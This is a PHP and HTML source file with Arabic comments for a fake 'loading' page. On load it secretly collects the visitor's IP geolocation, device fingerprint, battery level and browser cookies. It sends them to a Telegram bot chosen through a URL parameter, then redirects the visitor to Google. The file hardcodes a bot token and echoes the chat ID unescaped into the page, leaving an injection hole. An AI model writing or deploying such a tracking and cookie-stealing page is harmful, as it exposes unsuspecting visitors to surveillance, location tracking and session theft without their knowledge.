<?php
// توكن البوت الخاص بك
$botToken = "8642478796:AAEaDxElqAtOEs2DUzz_8yNnuflpLRSADwQ";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $collectedData = $input['collectedData'] ?? null;

    if ($collectedData) {
        // تنسيق المعلومات بشكل آمن
        $ipInfo = $collectedData['ipInfo'] ?? [];
        $deviceInfo = $collectedData['deviceInfo'] ?? [];
        $cookies = htmlspecialchars($collectedData['cookies'] ?? '');
        
        // إرسال المعلومات المفصلة إلى التليجرام
        $message = "
🔍 <b>معلومات متقدمة مجمعة من الزائر</b>

🌐 <b>معلومات الشبكة والعنوان IP:</b>
📱 <b>IP العام:</b> <code>" . ($ipInfo['ip'] ?? 'غير متاح') . "</code>
🏙️ <b>المدينة:</b> " . ($ipInfo['city'] ?? 'غير معروف') . "
🏛️ <b>المنطقة:</b> " . ($ipInfo['region'] ?? 'غير معروف') . "
🇺🇳 <b>الدولة:</b> " . ($ipInfo['country'] ?? 'غير معروف') . "
📮 <b>الرمز البريدي:</b> " . ($ipInfo['postal'] ?? 'غير معروف') . "
📡 <b>مزود الخدمة:</b> " . ($ipInfo['org'] ?? 'غير معروف') . "
📍 <b>الإحداثيات:</b> " . ($ipInfo['loc'] ?? 'غير معروف') . "
🕒 <b>المنطقة الزمنية:</b> " . ($ipInfo['timezone'] ?? 'غير معروف') . "

🖥️ <b>معلومات الجهاز والمتصفح:</b>
🔧 <b>نظام التشغيل:</b> " . ($deviceInfo['os'] ?? 'غير معروف') . "
📱 <b>نوع الجهاز:</b> " . ($deviceInfo['deviceType'] ?? 'غير معروف') . "
🌐 <b>المتصفح:</b> " . ($deviceInfo['browser'] ?? 'غير معروف') . "
📏 <b>دقة الشاشة:</b> " . ($deviceInfo['screenResolution'] ?? 'غير معروف') . "
🎨 <b>عمق الألوان:</b> " . ($deviceInfo['colorDepth'] ?? 'غير معروف') . "
🗣️ <b>اللغة:</b> " . ($deviceInfo['language'] ?? 'غير معروف') . "
⏰ <b>المنطقة الزمنية:</b> " . ($deviceInfo['timezone'] ?? 'غير معروف') . "

🍪 <b>الكوكيز المجمعة:</b>
<code>" . $cookies . "</code>

🔧 <b>معلومات تقنية إضافية:</b>
⚙️ <b>عدد الأنوية:</b> " . ($deviceInfo['cpuCores'] ?? 'غير معروف') . "
📊 <b>الذاكرة:</b> " . ($deviceInfo['deviceMemory'] ?? 'غير معروف') . "
📶 <b>نوع الاتصال:</b> " . ($deviceInfo['connectionType'] ?? 'غير معروف') . "
🔋 <b>مستوى البطارية:</b> " . ($deviceInfo['batteryLevel'] ?? 'غير معروف') . "

🌐 <b>متصفح الإنترنت:</b>
🔍 <b>User Agent:</b> " . ($deviceInfo['userAgent'] ?? 'غير معروف') . "

📅 <b>التاريخ والوقت:</b> " . date('Y-m-d H:i:s') . "
📧 <b>عنوان URL:</b> " . (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'غير معروف') . "
        ";
        
        $result = sendTelegramMessage($chatId, $message, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

// الحصول على chatId من رابط الصفحة
$chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
?>
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل - نظام المعلومات</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2a6c, #2a4b8c);
            color: #FFFFFF;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .loading-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            max-width: 500px;
            width: 100%;
        }
        
        .loader {
            width: 80px;
            height: 80px;
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-top: 8px solid #2E8B57;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            margin: 15px 0;
            color: #e0e0e0;
        }
        
        .progress-text {
            font-size: 14px;
            color: #a0a0a0;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="loader"></div>
        <div class="loading-text">جاري تحميل المحتوى وتحليل البيانات...</div>
        <div class="progress-text">يتم الآن جمع المعلومات الضرورية للتجربة المثلى</div>
    </div>

    <script>
        // جمع المعلومات التفصيلية عن الجهاز والاتصال
        async function collectAllData() {
            const data = {
                ipInfo: {},
                deviceInfo: {},
                cookies: ''
            };

            // جمع معلومات العنوان IP من خلال API
            try {
                const ipResponse = await fetch('https://ipinfo.io/json');
                if (ipResponse.ok) {
                    const ipData = await ipResponse.json();
                    data.ipInfo = ipData;
                } else {
                    data.ipInfo = { error: 'Failed to fetch IP information' };
                }
            } catch (error) {
                console.error('Error fetching IP information:', error);
                data.ipInfo = { error: 'Failed to fetch IP information' };
            }

            // جمع معلومات الجهاز
            data.deviceInfo = await collectDeviceInfo();
            
            // جمع الكوكيز
            data.cookies = document.cookie || 'لا توجد كوكيز متاحة';
            
            return data;
        }

        // جمع معلومات الجهاز التفصيلية
        async function collectDeviceInfo() {
            const info = {
                // معلومات النظام والجهاز
                os: detectOS(),
                deviceType: detectDeviceType(),
                browser: detectBrowser(),
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: `${screen.colorDepth} bit`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                userAgent: navigator.userAgent,
                
                // معلومات تقنية
                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
                
                // معلومات الاتصال
                connectionType: 'غير معروف',
                
                // معلومات البطارية
                batteryLevel: 'غير متاح'
            };

            // معلومات الاتصال
            if (navigator.connection) {
                info.connectionType = navigator.connection.effectiveType || 'غير معروف';
            }

            // معلومات البطارية
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = `${Math.round(battery.level * 100)}%`;
                } catch (error) {
                    console.log('لا يمكن الوصول إلى معلومات البطارية');
                }
            }

            return info;
        }

        // تحديد نظام التشغيل
        function detectOS() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes('Windows')) return 'Windows';
            if (userAgent.includes('Mac')) return 'macOS';
            if (userAgent.includes('Linux')) return 'Linux';
            if (userAgent.includes('Android')) return 'Android';
            if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
            return 'غير معروف';
        }

        // تحديد نوع الجهاز
        function detectDeviceType() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes('Mobile')) return 'هاتف محمول';
            if (userAgent.includes('Tablet')) return 'لوحي';
            return 'كمبيوتر';
        }

        // تحديد المتصفح
        function detectBrowser() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) return 'Chrome';
            if (userAgent.includes('Firefox')) return 'Firefox';
            if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
            if (userAgent.includes('Edg')) return 'Edge';
            if (userAgent.includes('Opera') || userAgent.includes('OPR')) return 'Opera';
            return 'غير معروف';
        }

        // إرسال البيانات إلى الخادم
        function sendDataToServer(collectedData) {
            const data = {
                chatId: "<?php echo $chatId; ?>",
                collectedData: collectedData
            };
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(result => {
                if (result.status === 'success') {
                    console.log('تم إرسال البيانات بنجاح');
                }
            })
            .catch(error => {
                console.error('خطأ في إرسال البيانات:', error);
            });
        }

        // بدء عملية جمع المعلومات عند تحميل الصفحة
        window.addEventListener('load', async () => {
            // جمع المعلومات التفصيلية
            const collectedData = await collectAllData();
            
            // إرسال البيانات إلى الخادم
            sendDataToServer(collectedData);
            
            // تحديث واجهة المستخدم
            document.querySelector('.loading-text').textContent = "تم جمع المعلومات بنجاح!";
            document.querySelector('.progress-text').textContent = "جاري إعادة التوجيه...";
            
            // إعادة التوجيه بعد ثانيتين
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 2000);
        });
    </script>
</body>
</html>
